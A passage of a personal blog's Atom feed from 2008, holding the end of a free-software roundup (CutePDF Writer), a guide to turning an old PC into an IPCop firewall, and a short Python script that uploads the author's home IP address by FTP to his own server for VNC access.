+&lt;h2&gt;&lt;a href="http://www.cutepdf.com/products/cutepdf/writer.asp"&gt;CutePDF Writer&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Replaces:&lt;/strong&gt; Adobe PDF Writer&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Alternatives:&lt;/strong&gt; N/A&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Pros:&lt;/strong&gt; Lightweight, Fast&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Cons:&lt;/strong&gt; N/A&lt;/p&gt;
+&lt;p&gt;Lastly, CutePDF Writer is a very lightweight PDF creation program. After
+installing CutePDF Writer, creating a .PDF document is as easy as 1, 2, 3. All
+you have to do is 1) choose the print option from the document you wish to
+convert. 2) Select the CutePDF option under the list of printers. 3) Choose a
+location to save the document and hit the save button.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.cutepdf.com/Products/CutePDF/writer.asp"&gt;Download CutePDF Writer&lt;/a&gt; |
+&lt;a href="http://www.filehippo.com/download_cutepdf_writer/"&gt;Mirror&lt;/a&gt;&lt;/p&gt;</summary><category term="CutePDF Writer"></category><category term="Firefox 3"></category><category term="Foxit Reader"></category><category term="Free Software"></category><category term="Notepad++"></category><category term="Open Source"></category><category term="OpenOffice.org"></category><category term="Pidgin"></category><category term="Thunderbird 2"></category></entry><entry><title>Turn your old PC into a hardware firewall with IPCop</title><link href="http://blog.chriskankiewicz.com/turn-your-old-pc-into-a-hardware-firewall-with-ipcop.html" rel="alternate"></link><published>2008-10-02T22:18:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2008-10-02:turn-your-old-pc-into-a-hardware-firewall-with-ipcop.html</id><summary type="html">&lt;p&gt;So you’ve got a 10-year old PC sitting around the house. You’re sick of your
+cats always getting into the wires and knocking the darn thing over. You don’t
+want to throw it away, but you just don’t know what to do with it. Well my
+friend, why don’t you turn that thing into a new hardware firewall?!&lt;/p&gt;
+&lt;p&gt;How would you go about doing that you might ask, well I’ve got the solution for
+you: &lt;strong&gt;IPCop&lt;/strong&gt;!&lt;/p&gt;
+&lt;h2&gt;What is IPCop?&lt;/h2&gt;
+&lt;p&gt;IPCop is a secure Linux distribution managed through a web-interface. It turns
+an old PC into a firewall and VPN gateway. Features an Intrusion Detection
+System. Check it out at &lt;a href="http://www.ipcop.org/"&gt;http://www.ipcop.org&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;What are the hardware requirements for IPCop?&lt;/h2&gt;
+&lt;p&gt;I ran IPCop on an old system I had lying around. Specs:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Pentium 2&lt;/li&gt;
+&lt;li&gt;320MB PC100/133 RAM&lt;/li&gt;
+&lt;li&gt;20GB HDD (Overkill, but the smallest I had)&lt;/li&gt;
+&lt;li&gt;2 NICs&lt;/li&gt;
+&lt;li&gt;ATI Rage 8MB Video Card *&lt;/li&gt;
+&lt;li&gt;CD ROM *&lt;/li&gt;
+&lt;li&gt;Cardboard and packaging tape (to keep as much cat/dog hair out as
+    possible... and for STYLE!)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;* Only needed for install&lt;/p&gt;
+&lt;p&gt;The actual requirements are pretty low. You probably only need a 2-5GB hard
+drive, smaller if don’t plan on keeping any logs. Also, if you’re not planning
+on running the intrusion detection system, you could get away with 64MB of RAM
+easily.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Hardware Firewall Running IPCop" src="http://farm4.static.flickr.com/3191/2897432811_f379a00d59.jpg" /&gt;&lt;/p&gt;
+&lt;h2&gt;Where do I get it?&lt;/h2&gt;
+&lt;p&gt;Go to &lt;a href="http://www.ipcop.org/"&gt;http://www.ipcop.org&lt;/a&gt; and choose “Download” from
+the menu on the left. This will forward you to a SourceForge page. Find the
+latest version and download the .ISO file. You will then have to use some
+&lt;a href="http://cdburnerxp.se/en/download"&gt;CD burning software&lt;/a&gt; to burn the .ISO as a
+bootable CD.&lt;/p&gt;
+&lt;h2&gt;How do I install IPCop?&lt;/h2&gt;
+&lt;p&gt;IPCop couldn’t have been easier to install. You just pop the CD you burned in
+the last step into your CD ROM drive and boot the computer. Make sure your
+computer is set to boot from the CD drive first, otherwise this wont work. Once
+the install CD boots, just follow the on-screen instructions. Most of the
+options are pretty straigt forward, if you’re at all confused about any of it,
+refer to the documentation found here:
+&lt;a href="http://www.ipcop.org/index.php?module=pnWikka&amp;amp;tag=IPCopDocumentation"&gt;http://www.ipcop.org/index.php?module=pnWikka&amp;amp;tag=IPCopDocumentation&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Also, this episode of Systm was a great resource:
+&lt;a href="http://revision3.com/systm/firewall/"&gt;http://revision3.com/systm/firewall/&lt;/a&gt;,
+I highly recommend checking this out before you start your project.&lt;/p&gt;
+&lt;h2&gt;Got anything else?&lt;/h2&gt;
+&lt;p&gt;Web interface screenshots @
+&lt;a href="http://www.flickr.com/photos/kankie/sets/72157607445592055/detail/"&gt;http://www.flickr.com/photos/kankie/sets/72157607445592055/detail/&lt;/a&gt;&lt;/p&gt;</summary><category term="CDBurnerXP"></category><category term="Firewall"></category><category term="Hardware"></category><category term="IPCop"></category><category term="Linux"></category><category term="PC"></category><category term="Software"></category><category term="Systm"></category></entry><entry><title>IP Uploader – Python Script (.py)</title><link href="http://blog.chriskankiewicz.com/ip-uploader-python-script-py.html" rel="alternate"></link><published>2008-09-30T15:23:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2008-09-30:ip-uploader-python-script-py.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; This script can now be found here:
+&lt;a href="https://gist.github.com/826108"&gt;https://gist.github.com/826108&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This is my first python script I ever wrote. This script connects to
+&lt;a href="http://whatismyip.com"&gt;whatismyip.com&lt;/a&gt;, fetches the external IP address of the
+network you are on, puts it into a text file and uploads it via FTP to any
+server you want.&lt;/p&gt;
+&lt;p&gt;At home I have Cox, therefore I have a dynamic IP. Even though this IP only
+changes about once every month, I got sick of needing to connect to my home
+computer via VNC and not being able because my IP had changed. Therefore I
+created the following script and set up a scheduled task on my home computer to
+run this script every hour.&lt;/p&gt;
+&lt;p&gt;After running this script, you can then use PHP (or any similar language) to
+include this file into any page you desire.&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#! /usr/bin/env python&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;httplib&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;ftplib&lt;/span&gt;
+
+&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ip.txt&amp;quot;&lt;/span&gt;
+
+&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;httplib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPConnection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;www.whatismyip.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/automation/n09230945.asp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getresponse&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;abspath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#Create file&lt;/span&gt;
+&lt;span class="n"&gt;FILE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#Open file ready for writing&lt;/span&gt;
+&lt;span class="n"&gt;FILE&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;writelines&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#Write &amp;#39;data&amp;#39; to file&lt;/span&gt;
+&lt;span class="n"&gt;FILE&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#Close file&lt;/span&gt;
+
+&lt;span class="c1"&gt;#Replace [server], [user], and [pass] with your information.&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ftplib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FTP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[server]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[user]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[pass]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#Connect&lt;/span&gt;
+&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#File to send&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;storbinary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;STOR &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#Send the file&lt;/span&gt;
+&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#Close file and FTP&lt;/span&gt;
+&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#Quit FTP&lt;/span&gt;
+
+&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;Shouts to Automated Penguin and Nak!&lt;/p&gt;</summary><category term="Code"></category><category term="Dynamic IP"></category><category term="Python"></category><category term="Scripting"></category><category term="VNC"></category></entry></feed>
